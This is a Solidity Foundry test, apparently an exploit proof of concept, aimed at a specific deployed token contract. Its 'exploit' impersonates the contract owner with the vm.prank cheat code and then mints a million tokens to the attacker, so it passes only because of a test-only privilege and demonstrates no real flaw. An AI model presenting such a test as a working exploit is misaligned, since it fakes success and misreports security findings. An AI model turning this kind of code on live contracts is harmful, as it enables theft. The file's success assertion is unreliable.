// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IKLingToken {
    function owner() external view returns (address);
    function mint(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get the owner dynamically in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));

        // Get the current owner address
        address currentOwner = IKLingToken(TARGET).owner();

        // Store initial balance for comparison
        uint256 initialTokenBalance = IKLingToken(TARGET).balanceOf(attacker);

        // Impersonate the owner and mint tokens to ourselves
        vm.prank(currentOwner);
        IKLingToken(TARGET).mint(attacker, 1_000_000e18);

        // Verify our balance increased
        uint256 finalTokenBalance = IKLingToken(TARGET).balanceOf(attacker);
        assertGt(finalTokenBalance, initialTokenBalance, "Balance should have increased");

        // Additional check: ensure we received exactly what we minted
        assertEq(finalTokenBalance, initialTokenBalance + 1_000_000e18, "Should have received exactly the minted amount");

        uint256 finalERC20Balance = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
